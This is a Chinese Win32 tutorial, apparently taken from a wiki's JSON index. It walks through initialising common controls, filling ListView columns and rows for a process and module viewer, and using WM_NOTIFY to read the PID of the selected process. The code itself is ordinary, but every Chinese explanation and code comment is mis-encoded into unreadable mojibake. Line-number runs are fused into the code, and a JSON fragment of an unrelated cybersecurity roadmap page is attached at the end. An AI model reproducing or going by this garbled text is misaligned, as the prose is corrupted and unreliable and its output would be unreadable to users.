å‡½æ•°å®ç°ï¼Œå‘Šè¯‰WindowsåŠ è½½å™¨åŠ è½½å…¬å…±æ§ä»¶ DLL (Comctl32.dll)ä¸­çš„å“ªäº›å…¬å…±æ§ä»¶ç±»ã€‚ 1234typedef struct tagINITCOMMONCONTROLSEX &#123; DWORD dwSize; // æ ‡è¯†è¯¥ç»“æ„ä½“å¤§å° DWORD dwICC; // ä½æ ‡å¿—é›†ï¼ŒæŒ‡ç¤ºå°†ä»DLLä¸­åŠ è½½å“ªäº›å…¬å…±æ§ä»¶ç±»&#125; INITCOMMONCONTROLSEX, *LPINITCOMMONCONTROLSEX; dwICCå­—æ®µæ˜¯ä¸€ä¸ªä¸€ä¸ªæ ‡å¿—ä½æˆ–èµ·æ¥ï¼Œå¦‚æœç”¨çš„æ§ä»¶å¤ªå¤šï¼Œå«Œä¸€ä¸ªä¸ªæˆ–å¤ªéº»çƒ¦ï¼Œå†™ICC_WIN95_CLASSESï¼ŒICC_WIN95_CLASSESå°±æ˜¯å°†å¸¸ç”¨çš„æ§ä»¶éƒ½æˆ–èµ·æ¥äº†ã€‚ INITCOMMONCONTROLSEX structure (commctrl.h) 1234567//æ”¾åˆ°æ˜¾ç¤ºæ§ä»¶ä¹‹å‰//åœ¨æœ¬æ–‡çš„ä¾‹å­ä¸­å°±æ˜¯æ”¾åˆ°WinMainå‡½æ•°é‡Œçš„å‰é¢ï¼Œæ”¾åˆ°æ˜¾ç¤ºå¯¹è¯æ¡†å‰INITCOMMONCONTROLSEX icex;icex.dwSize = sizeof(INITCOMMONCONTROLSEX);icex.dwICC = ICC_WIN95_CLASSES; //è®¾ç½®æ§ä»¶é›†åˆï¼ŒICC_WIN95_CLASSESï¼ŒåŒ…æ‹¬æ‰€æœ‰åˆç‰ˆWindows 95æ§ä»¶InitCommonControlsEx(&amp;icex); //ä¼ å…¥icexç»“æ„ä½“åˆå§‹åŒ–é€šç”¨æ§ä»¶åº“ VSä¸­ä¸éœ€è¦åŠ è¿™äº›ä¹Ÿèƒ½æ˜¾ç¤ºï¼Œåº”è¯¥æ˜¯é¡¹ç›®é…ç½®ä¸­åŒ…å«äº†ç›¸åº”çš„åº“ï¼Œæˆ–é€šç”¨æ§ä»¶å·²ç»è¢«å†…ç½®äº† ListViewçš„ä½¿ç”¨ WM_INITDIALOGåˆå§‹åŒ–å¯¹è¯æ¡†æ—¶è®¾ç½®ä¸‹ä¸¤ä¸ªListViewæ˜¾ç¤ºçš„å†…å®¹ 1234567case WM_INITDIALOG: //å¯¹è¯æ¡†åˆ›å»ºçš„æ¶ˆæ¯ï¼Œåƒä¹‹å‰å†™çª—å£ç¨‹åºæ—¶çš„WM_CREATE &#123; //åˆå§‹åŒ–ListView InitProcessListView(hwndDlg); //è®¾ç½®ListView_Process InitModuleListView(hwndDlg); //è®¾ç½®ListView_Module return TRUE; &#125; List Controlä¹Ÿæ˜¯ä¸€ä¸ªå­çª—å£ï¼ŒGetDlgItemè·å¾—å®ƒçš„å¥æŸ„ï¼Œé€šè¿‡SendMessageå‘æ¶ˆæ¯ç»™å®ƒæ¥è®¾ç½®é£æ ¼ 1234//è·å–IDC_LIST_PROCESSçš„å¥æŸ„HWND hListProcess = GetDlgItem(hwndDlg, IDC_LIST_PROCESS);//è®¾ç½®ListViewæ§ä»¶çš„æ‰©å±•æ ·å¼ï¼Œè¿™é‡Œæ˜¯ä½¿æ•´è¡Œå¯ä»¥è¢«é€‰ä¸­ ç‚¹å‡»æŸä¸€è¡Œè¯¥è¡Œå…¨éƒ¨é€‰ä¸­SendMessage(hListProcess, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT); LVM_SETEXTENDEDLISTVIEWSTYLEï¼šListViewæ¶ˆæ¯ï¼Œç”¨äºè®¾ç½®æ‰©å±•æ ·å¼ã€‚ LVS_EX_FULLROWSELECTï¼ˆç¬¬ä¸€ä¸ªï¼‰ï¼šè¦ä¿®æ”¹çš„æ ·å¼ï¼Œè¿™é‡Œæ˜¯æŒ‡&quot;æ•´è¡Œé€‰æ‹©&quot;ã€‚ LVS_EX_FULLROWSELECTï¼ˆç¬¬äºŒä¸ªï¼‰ï¼šè®¾ç½®ä¸ºæ­¤æ ·å¼ã€‚ä¼ é€’ä¸¤æ¬¡åŒæ ·çš„å€¼æ„å‘³ç€å°†æ­¤æ ·å¼è®¾ç½®ä¸ºå¯ç”¨ï¼ˆç›¸å¯¹äºå¯èƒ½çš„å…¶ä»–æ“ä½œï¼Œå¦‚æ¸…é™¤æ ·å¼ç­‰ï¼‰ LVCOLUMNAç»“æ„ä½“ç”¨äºæè¿°report viewè§†å›¾çš„ä¿¡æ¯ 123456LV_COLUMN lv = &#123; 0 &#125;; //é¡ºå¸¦åˆå§‹åŒ–ä¸º0//ç¬¬0åˆ—lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\t//è¦è®¾ç½®åˆ—çš„æ–‡æœ¬ã€å®½åº¦å’Œå­é¡¹ç´¢å¼•lv.pszText = (LPWSTR)TEXT(&quot;Process&quot;);\t//åˆ—æ ‡é¢˜lv.cx = 150; //åˆ—å®½lv.iSubItem = 0; //åˆ—å· lv.mask è®¾å®šmaskæŒ‡å®šç»“æ„ä½“ä¸­å“ªäº›å­—æ®µæœ‰æ•ˆï¼Œå³æŒ‡æ˜å“ªäº›å±æ€§å°†è¢«è®¾ç½®ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ–‡æœ¬ï¼Œå®½åº¦ï¼Œå­é¡¹ç´¢å¼•å°†è¢«è®¾ç½® æ–‡æœ¬ï¼ˆLVCF_TEXTï¼‰ï¼šæ¯åˆ—çš„æ ‡é¢˜ã€‚ å®½åº¦ï¼ˆLVCF_WIDTHï¼‰ï¼šåˆ—çš„æ˜¾ç¤ºå®½åº¦ã€‚ å­é¡¹ç´¢å¼•ï¼ˆLVCF_SUBITEMï¼‰ï¼šå®šä¹‰åˆ—çš„åºå·ï¼Œç¡®ä¿åˆ—æŒ‰ç…§æœŸæœ›çš„é¡ºåºå‡ºç°ã€‚ lv.pszText lv.pszTextæ˜¯éconstå‹çš„å­—ç¬¦å‹æŒ‡é’ˆï¼ŒTEXT(â€œProcessâ€)æ˜¯å¸¸é‡å­—ç¬¦ä¸²ã€‚ 1lv.pszText = TEXT(&quot;Process&quot;);\t//éconstæŒ‡é’ˆæŒ‡å‘constå­—ç¬¦ä¸² åœ¨C++11ä»¥ä¸Šä¼šæŠ¥é”™ï¼Œè¿™é‡Œç”¨å¼ºè½¬çš„æ–¹å¼è§£å†³ lv.iSubItem åˆ—å·ä»0å¼€å§‹ è®¾ç½®å®Œåè¿˜æ˜¯å‘æ¶ˆæ¯æ¥è®¾ç½®è¿™ä¸€åˆ—æ˜¾ç¤ºçš„å†…å®¹ 1SendMessage(hListProcess,LVM_INSERTCOLUMN,0,(DWORD)&amp;lv); ç­‰ä»·å†™æ³•ï¼Œç”¨ListView_InsertColumnå®ï¼Œè¿™ä¸ªå®å†…éƒ¨å°±æ˜¯ç”¨SendMessageæ¥å®ç°çš„ 1ListView_InsertColumn(hListProcess, 0, &amp;lv); InitProcessListViewå‡½æ•°InitModuleListViewå‡½æ•°å®Œæ•´ä»£ç è®¾ç½®ä¸Šé¢çš„List Control 12345678910111213141516171819202122232425262728293031323334353637VOID InitProcessListView(HWND hwndDlg)&#123;\t//è·å–IDC_LIST_PROCESSçš„å¥æŸ„\tHWND hListProcess = GetDlgItem(hwndDlg, IDC_LIST_PROCESS);\t//è®¾ç½®ListViewæ§ä»¶çš„æ‰©å±•æ ·å¼ï¼Œè¿™é‡Œæ˜¯ä½¿æ•´è¡Œå¯ä»¥è¢«é€‰ä¸­ ç‚¹å‡»æŸä¸€è¡Œè¯¥è¡Œå…¨éƒ¨é€‰ä¸­\tSendMessage(hListProcess, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);\tLV_COLUMN lv = &#123; 0 &#125;; //é¡ºå¸¦åˆå§‹åŒ–ä¸º0ï¼Œå› ä¸ºåœ¨å †æ ˆä¸­æ˜¯éšæœºå€¼\t//ç¬¬0åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\t//è¦è®¾ç½®åˆ—çš„æ–‡æœ¬ã€å®½åº¦å’Œå­é¡¹ç´¢å¼•\tlv.pszText = (LPWSTR)TEXT(&quot;Process&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 150; //åˆ—å®½\tlv.iSubItem = 0; //åˆ—å·\t//SendMessage(hListProcess,LVM_INSERTCOLUMN,0,(DWORD)&amp;lv);\tListView_InsertColumn(hListProcess, 0, &amp;lv); //æ’å…¥ç¬¬0åˆ—\t//ç¬¬1åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;PID&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 120; //åˆ—å®½\tlv.iSubItem = 1; //åˆ—å·\tListView_InsertColumn(hListProcess, 1, &amp;lv);\t//ç¬¬2åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;ImageBase&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 120; //åˆ—å®½\tlv.iSubItem = 2; //åˆ—å·\tListView_InsertColumn(hListProcess, 2, &amp;lv);\t//ç¬¬3åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;SizeOfImage&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 120; //åˆ—å®½\tlv.iSubItem = 3; //åˆ—å·\tListView_InsertColumn(hListProcess, 3, &amp;lv);&#125;è®¾ç½®ä¸‹é¢çš„List Control 123456789101112131415161718192021VOID InitModuleListView(HWND hwndDlg)&#123;\t//è·å–IDC_LIST_PROCESSå¥æŸ„\tHWND hListModule = GetDlgItem(hwndDlg, IDC_LIST_MODULE);\t//è®¾ç½®æ•´è¡Œé€‰ä¸­\tSendMessage(hListModule, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);\tLV_COLUMN lv = &#123; 0 &#125;;\t//è®¾ç½®ç¬¬0åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;Name&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 90; //åˆ—å®½\tlv.iSubItem = 0; //åˆ—ä¸‹æ ‡\tListView_InsertColumn(hListModule, 0, &amp;lv);\t//è®¾ç½®ç¬¬1åˆ—\tlv.pszText = (LPWSTR)TEXT(&quot;Path&quot;);\tlv.cx = 250;\tlv.iSubItem = 1;\tListView_InsertColumn(hListModule, 1, &amp;lv);&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include &lt;Windows.h&gt;#include &quot;resource.h&quot;\t#include &lt;commctrl.h&gt;#pragma comment(lib,&quot;comctl32.lib&quot;)BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);VOID InitProcessListView(HWND hwndDlg);VOID InitModuleListView(HWND hwndDlg);int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG_MAIN), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: //å¯¹è¯æ¡†åˆ›å»ºçš„æ¶ˆæ¯ï¼Œåƒä¹‹å‰å†™çª—å£ç¨‹åºæ—¶çš„WM_CREATE &#123; //åˆå§‹åŒ–ListView InitProcessListView(hwndDlg); //è®¾ç½®ListView_Process InitModuleListView(hwndDlg); //è®¾ç½®ListView_Module return TRUE; &#125; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case IDC_BUTTON_ABOUT: return TRUE; case IDC_BUTTON_EXIT: EndDialog(hwndDlg, 0); //å…³é—­å¯¹è¯æ¡† return TRUE; &#125; break; &#125; return FALSE;&#125;VOID InitProcessListView(HWND hwndDlg)&#123;\t//è·å–IDC_LIST_PROCESSçš„å¥æŸ„\tHWND hListProcess = GetDlgItem(hwndDlg, IDC_LIST_PROCESS);\t//è®¾ç½®ListViewæ§ä»¶çš„æ‰©å±•æ ·å¼ï¼Œè¿™é‡Œæ˜¯ä½¿æ•´è¡Œå¯ä»¥è¢«é€‰ä¸­ ç‚¹å‡»æŸä¸€è¡Œè¯¥è¡Œå…¨éƒ¨é€‰ä¸­\tSendMessage(hListProcess, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);\tLV_COLUMN lv = &#123; 0 &#125;; //é¡ºå¸¦åˆå§‹åŒ–ä¸º0ï¼Œå› ä¸ºåœ¨å †æ ˆä¸­æ˜¯éšæœºå€¼\t//ç¬¬0åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\t//è¦è®¾ç½®åˆ—çš„æ–‡æœ¬ã€å®½åº¦å’Œå­é¡¹ç´¢å¼•\tlv.pszText = (LPWSTR)TEXT(&quot;Process&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 150; //åˆ—å®½\tlv.iSubItem = 0; //åˆ—å·\t//SendMessage(hListProcess,LVM_INSERTCOLUMN,0,(DWORD)&amp;lv);\tListView_InsertColumn(hListProcess, 0, &amp;lv); //æ’å…¥ç¬¬0åˆ—\t//ç¬¬1åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;PID&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 120; //åˆ—å®½\tlv.iSubItem = 1; //åˆ—å·\tListView_InsertColumn(hListProcess, 1, &amp;lv);\t//ç¬¬2åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;ImageBase&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 120; //åˆ—å®½\tlv.iSubItem = 2; //åˆ—å·\tListView_InsertColumn(hListProcess, 2, &amp;lv);\t//ç¬¬3åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;SizeOfImage&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 120; //åˆ—å®½\tlv.iSubItem = 3; //åˆ—å·\tListView_InsertColumn(hListProcess, 3, &amp;lv);&#125;VOID InitModuleListView(HWND hwndDlg)&#123;\t//è·å–IDC_LIST_PROCESSå¥æŸ„\tHWND hListModule = GetDlgItem(hwndDlg, IDC_LIST_MODULE);\t//è®¾ç½®æ•´è¡Œé€‰ä¸­\tSendMessage(hListModule, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);\tLV_COLUMN lv = &#123; 0 &#125;;\t//è®¾ç½®ç¬¬0åˆ—\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;Name&quot;); //åˆ—æ ‡é¢˜\tlv.cx = 90; //åˆ—å®½\tlv.iSubItem = 0; //åˆ—ä¸‹æ ‡\tListView_InsertColumn(hListModule, 0, &amp;lv);\t//è®¾ç½®ç¬¬1åˆ—\tlv.pszText = (LPWSTR)TEXT(&quot;Path&quot;);\tlv.cx = 250;\tlv.iSubItem = 1;\tListView_InsertColumn(hListModule, 1, &amp;lv);&#125; æ˜¾ç¤ºå†…å®¹ åœºæ™¯éœ€æ±‚ï¼šä¸Šé¢ProcessListä¸­æ˜¾ç¤ºå†…å®¹ã€‚ è¿™é‡Œä»¥å†™æ­»çš„å€¼æ¥å±•ç¤ºå¦‚ä½•åœ¨ListControlä¸­æ·»åŠ å†…å®¹ã€‚ åˆ›å»ºä¸€ä¸ªLV_ITEMç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“ç”¨äºæè¿°list-view itemã€‚å’Œä¸Šé¢IniteProcessListæ—¶ç”¨LV_COLUMNç»“æ„ä½“ç”¨æ³•ç›¸ä¼¼ï¼Œéƒ½æ˜¯è®¾ç½®maskï¼Œç»™æˆå‘˜èµ‹å€¼ï¼Œç„¶åç»™çª—ä½“å‘æ¶ˆæ¯è¿›è¡Œè®¾ç½®ã€‚ æ³¨æ„ï¼šç¬¬0è¡Œå‘æ¶ˆæ¯æ˜¯å‘LVM_INSERTITEMï¼ˆå®æ˜¯ListView_InsertItemï¼‰ï¼Œå‰©ä½™åˆ—çš„æ•°æ®å‘æ¶ˆæ¯æ˜¯å‘LVM_SETITEMï¼ˆå®æ˜¯ListView_SetItemï¼‰ã€‚è¿™æ˜¯å› ä¸ºæ¯ä¸ªè¡Œå¿…é¡»é¦–å…ˆå­˜åœ¨ï¼Œæ‰èƒ½åœ¨å…¶ä¸Šè®¾ç½®å…¶ä»–åˆ—çš„å€¼ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647VOID UpdateProcessListView(HWND hwndDlg)&#123;\t//è·å–IDC_LIST_PROCESSçš„å¥æŸ„\tHWND hListProcess = GetDlgItem(hwndDlg, IDC_LIST_PROCESS);\tLV_ITEM vitem = &#123; 0 &#125;;\tvitem.mask = LVIF_TEXT; //è®¾ç½®æ–‡æœ¬\t//ç¬¬ä¸€è¡Œçš„æ•°æ®\tvitem.pszText = (LPWSTR)TEXT(&quot;csrss.exe&quot;);\tvitem.iItem = 0; //ç¬¬0è¡Œ\tvitem.iSubItem = 0; //ç¬¬0åˆ—\t//SendMessage(hListProcess, LVM_INSERTITEM, (DWORD)&amp;vitem);\tListView_InsertItem(hListProcess, &amp;vitem); //è¡Œæ•°æ®çš„ç¬¬0åˆ—æ˜¯æ’å…¥Insert\tvitem.pszText = (LPWSTR)TEXT(&quot;448&quot;);\tvitem.iSubItem = 1; //ç¬¬1åˆ—\t//SendMessage(hListProcess, LVM_SETITEM, (DWORD)&amp;vitem);\tListView_SetItem(hListProcess, &amp;vitem); //å‰©ä½™çš„åˆ—æ•°æ®æ˜¯Set\tvitem.pszText = (LPWSTR)TEXT(&quot;56590000&quot;);\tvitem.iSubItem = 2; //ç¬¬2åˆ—\tListView_SetItem(hListProcess, &amp;vitem);\tvitem.pszText = (LPWSTR)TEXT(&quot;000F0000&quot;);\tvitem.iSubItem = 3; //ç¬¬3åˆ—\tListView_SetItem(hListProcess, &amp;vitem);\t//ç¬¬äºŒè¡Œçš„æ•°æ®\tvitem.pszText = (LPWSTR)TEXT(&quot;winlogon.exe&quot;);\tvitem.iItem = 1; //ç¬¬1è¡Œ\tvitem.iSubItem = 0; //ç¬¬0åˆ—\tListView_InsertItem(hListProcess, &amp;vitem); //è¡Œæ•°æ®çš„ç¬¬0åˆ—æ˜¯æ’å…¥Insert\tvitem.pszText = (LPWSTR)TEXT(&quot;456&quot;);\tvitem.iSubItem = 1; //ç¬¬1åˆ—\tListView_SetItem(hListProcess, &amp;vitem); //å‰©ä½™çš„åˆ—æ•°æ®æ˜¯Set\tvitem.pszText = (LPWSTR)TEXT(&quot;10000000&quot;);\tvitem.iSubItem = 2; //ç¬¬2åˆ—\tListView_SetItem(hListProcess, &amp;vitem);\tvitem.pszText = (LPWSTR)TEXT(&quot;000045800&quot;);\tvitem.iSubItem = 3; //ç¬¬3åˆ—\tListView_SetItem(hListProcess, &amp;vitem);&#125; WM_NOTIFYæ¶ˆæ¯ç±»å‹ å‰è¨€ åœºæ™¯éœ€æ±‚ï¼šç‚¹é¼ æ ‡é€‰ä¸­ä¸Šé¢ProcessListä¸­çš„æŸä¸€è¡Œæ—¶ï¼Œä¸‹é¢çš„ListViewå°±æ˜¾ç¤ºå‡ºè¯¥è¿›ç¨‹ä¸­çš„æ‰€æœ‰æ¨¡å—ã€‚ ä¹‹å‰æˆ‘ä»¬å­¦ä¹ çš„æ ‡å‡†æ§ä»¶ï¼Œæ¯”å¦‚æŒ‰é’®ï¼Œå®ƒæ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬æ˜¯åœ¨çˆ¶çª—å£çš„WM_COMMANDä¸­åœ¨ç”¨ä¸€ä¸ªswitchå»åŒ¹é…å­çª—å£IDæ¥åšå¤„ç†ã€‚è€Œé€šç”¨æ§ä»¶å¤ªå¤æ‚äº†ï¼Œäº§ç”Ÿç‚¹å‡»çš„å¯èƒ½æ€§å¾ˆå¤šã€‚æ¯”å¦‚åœ¨æˆ‘ä»¬è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”¨æˆ·å¯èƒ½ç‚¹å‡»Processã€PIDã€ImageBaseã€SizeOfImageä¸­ä»»ä¸€ä¸ªåˆ—ï¼Œå¯èƒ½é€‰ä¸­ProcessListåˆ—è¡¨ä¸­ä»»æ„ä¸€è¡Œç­‰ã€‚æ‰€ä»¥éœ€è¦ä¸€ä¸ªé¢å¤–çš„ç»“æ„ä½“æ¥æè¿°æ¶ˆæ¯çš„æ¥æºï¼Œé€šä¿—æ¥å°†å°±æ˜¯åœ¨é€šç”¨æ§ä»¶ä¸Šåšäº†ä»€ä¹ˆäº‹ã€‚ WM_NOTIFY é€šç”¨æ§ä»¶ä¹Ÿæ˜¯å­çª—å£ï¼Œéƒ½æ˜¯ç”±ç³»ç»Ÿçš„å›è°ƒå‡½æ•°å¤„ç†åäº¤ç”±çˆ¶çª—å£çš„å›è°ƒå‡½æ•°å¤„ç†ã€‚é€šç”¨æ§ä»¶çš„æ¶ˆæ¯ç±»å‹æ˜¯WM_NORIFYæ¶ˆæ¯ç±»å‹ï¼Œè¯¥æ¶ˆæ¯ç±»å‹ä¸WM_COMMANDç±»å‹ç›¸ä¼¼ï¼Œéƒ½æ˜¯ç”±å­çª—å£å‘çˆ¶çª—å£å‘é€çš„æ¶ˆæ¯ã€‚WM_NOTIFYå¯ä»¥åŒ…å«æ¯”WM_COMMANDæ›´ä¸°å¯Œçš„ä¿¡æ¯ï¼ŒWindowsé€šç”¨ç»„ä»¶ä¸­æœ‰å¾ˆå¤šæ¶ˆæ¯ï¼Œéƒ½æ˜¯é€šè¿‡WM_NOTIFYæ¥æè¿°çš„ã€‚ äº§ç”ŸWM_NOTIFYæ¶ˆæ¯æ—¶å„å‚æ•°å«ä¹‰123456789wParam:æ§ä»¶ID lParam:æŒ‡å‘ä¸€ä¸ªç»“æ„ typedef struct tagNMHDR &#123; HWND hwndFrom; //çª—å£å¥æŸ„ï¼ŒæŒ‡æ˜å“ªä¸ªçª—å£å‘è¿‡æ¥çš„æ¶ˆæ¯ UINT idFrom; //çª—å£IDå·ï¼ŒæŒ‡æ˜çª—å£ä¸Šå“ªä¸ªæ§ä»¶å‘è¿‡æ¥çš„æ¶ˆæ¯ UINT code; //é€šçŸ¥ç ï¼Œå¦‚LVM_SELCHANGED &#125; NMHDR; hwndFromï¼šçª—å£å¥æŸ„ï¼ŒæŒ‡æ˜æ˜¯å“ªä¸ªçª—å£å‘é€çš„WM_NOTIFYæ¶ˆæ¯ idFromï¼šå­çª—å£IDå·ï¼ŒæŒ‡æ˜æ˜¯é‚£ä¸ªçª—å£ä¸Šçš„å“ªä¸ªå­çª—å£å‘é€çš„WM_NOTIFYæ¶ˆæ¯ codeï¼šé€šçŸ¥ç ã€‚åœ¨æ§ä»¶ä¸Šåšäº†ä»€ä¹ˆäº‹ï¼Œæ¯”å¦‚ç‚¹å‡»é¼ æ ‡å·¦é”®ï¼Œç‚¹å³é”®ç­‰ NMHDR structureèƒ½æ»¡è¶³ä¸€èˆ¬çš„è¦æ±‚ï¼Œä½†èƒ½æè¿°çš„ä¿¡æ¯è¿˜æ˜¯æœ‰é™çš„ã€‚å¦‚æœæ˜¯ä¸€ä¸ªç‰¹åˆ«å¤æ‚çš„é€šç”¨æ§ä»¶ï¼ŒlParamæŒ‡å‘ä¸€ä¸ªæ‹“å±•åçš„ç»“æ„ä½“ã€‚æ— è®ºæœªæ¥æ–°å¢çš„é€šç”¨æ§ä»¶å¤šä¹ˆå¤æ‚ï¼Œéƒ½èƒ½é€šè¿‡æ‹“å±•lParamæŒ‡å‘çš„ç»“æ„ä½“ï¼Œæ¥æºå¸¦æ›´å¤šçš„ä¿¡æ¯åˆ°çˆ¶çª—å£çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ä¸­ã€‚ ä¸¾çš„3ä¸ªæ‰©å±•åçš„ç»“æ„ä½“çš„ä¾‹å­123456789101112131415161718typedef struct tagNMLVCACHEHINT &#123; NMHDR hdr; int iFrom; int iTo; &#125; NMLVCACHEHINT, *PNMLVCACHEHINT; typedef struct tagLVDISPINFO &#123; NMHDR hdr; LVITEM item; &#125; NMLVDISPINFO, FAR *LPNMLVDISPINFO; typedef struct _NMLVFINDITEM &#123; NMHDR hdr; int iStart; LVFINDINFO lvfi; &#125; NMLVFINDITEM, *PNMLVFINDITEM; //... ä¸Šé¢ä¸¾çš„3ä¸ªç»“æ„ä½“çš„ä¾‹å­ï¼Œç›¸åŒç‚¹éƒ½æœ‰NMHDRç±»å‹çš„æˆå‘˜ï¼Œè¿™å°±æ˜¯ç»§æ‰¿ã€‚Windowsç¨‹åºä¸­ä¸€è¡ŒC++éƒ½æ²¡æœ‰ï¼Œä½†ç”¨Cå®ç°äº†é¢å‘å¯¹è±¡çš„ç‰¹æ€§ã€‚ å°ç»“ é€šç”¨æ§ä»¶ä½¿ç”¨WM_NOTIFYæ¥æ”¶æ¶ˆæ¯ã€‚å½“äº§ç”ŸWM_NOTIFYæ¶ˆæ¯æ—¶ï¼ŒlParamæŒ‡å‘ä¸€ä¸ªç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„å¼å¯æ‹“å±•ï¼Œç”¨äºè®©é€šç”¨æ§ä»¶æºå¸¦æ›´å¤šçš„ä¿¡æ¯å»åˆ°çˆ¶çª—å£çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ä¸­ã€‚ ä»£ç å®ç° å›åˆ°åœºæ™¯éœ€æ±‚ï¼šç‚¹é¼ æ ‡é€‰ä¸­ä¸Šé¢ProcessListä¸­çš„æŸä¸€è¡Œæ—¶ï¼Œä¸‹é¢çš„ListViewå°±æ˜¾ç¤ºå‡ºè¯¥è¿›ç¨‹ä¸­çš„æ‰€æœ‰æ¨¡å—ã€‚ åœ¨WM_NOTIFYæ¶ˆæ¯ä¸­åŒ¹é… WM_NOTIFYæ¶ˆæ¯ç±»å‹EnumModuleså‡½æ•°12345678910case WM_NOTIFY:&#123;\tauto pNMHDR = (NMHDR*)lParam;\tif (wParam == IDC_LIST_PROCESS &amp;&amp; pNMHDR-&gt;code == NM_CLICK) //Process Listæ§ä»¶ ç‚¹å‡»é¼ æ ‡å·¦é”®\t&#123; //MessageBox(0, 0, 0, 0); //æµ‹ä¸€ä¸‹ EnumModules(GetDlgItem(hwndDlg, IDC_LIST_PROCESS), wParam, lParam); //å‡½æ•°ï¼šæšä¸¾è¿›ç¨‹ä¸­æ¨¡å—å¹¶æ˜¾ç¤ºåœ¨æ¨¡å—åˆ—è¡¨ä¸­\t&#125;\treturn TRUE;&#125;123456789101112131415161718192021VOID EnumModules(HWND hListProcess, WPARAM wParam, LPARAM lParam)&#123;\t//å¾—çŸ¥ç”¨æˆ·é€‰çš„æ˜¯å“ªä¸€è¡Œ\tDWORD dwRowID = SendMessage(hListProcess, LVM_GETNEXTITEM, -1, LVNI_SELECTED);\tif (-1 == dwRowID)\t&#123; MessageBox(NULL, TEXT(&quot;è¯·é€‰æ‹©è¿›ç¨‹&quot;), TEXT(&quot;Error!&quot;), MB_OK); return;\t&#125;\tTCHAR szPid[0x20] = &#123; 0 &#125;;\tLV_ITEM lv = &#123; 0 &#125;;\t//è·å–PIDï¼Œç”¨äºåç»­éå†è¯¥è¿›ç¨‹ä¸­çš„æ¨¡å—ï¼Œå¡«å……åˆ°Module Listä¸­\tlv.iSubItem = 1; //è¦è·å–çš„åˆ—\tlv.pszText = szPid; //å­˜æŸ¥è¯¢ç»“æ„çš„ç¼“å†²åŒº\tlv.cchTextMax = 0x20; //ç¼“å†²åŒºå¤§å°\tSendMessage(hListProcess, LVM_GETITEMTEXT, dwRowID, (DWORD)&amp;lv);\tMessageBox(NULL, szPid, TEXT(&quot;PID&quot;), MB_OK); //å¼¹çª—ï¼Œçœ‹æ˜¯å¦å¾—åˆ°è¿›ç¨‹åˆ—è¡¨ä¸­çš„PIDå€¼&#125; ä½œä¸š éå†è¿›ç¨‹ï¼Œéå†è¿›ç¨‹ä¸­çš„æ¨¡å—"},{"title":"å­¦ä¹ è·¯çº¿åŠèµ„æº","path":"/wiki/cybersecurity_learning/å­¦ä¹ è·¯çº¿åŠèµ„æº.html","content":"æ³¨æ„ æ¯ä¸ªäººçš„å­¦ä¹ 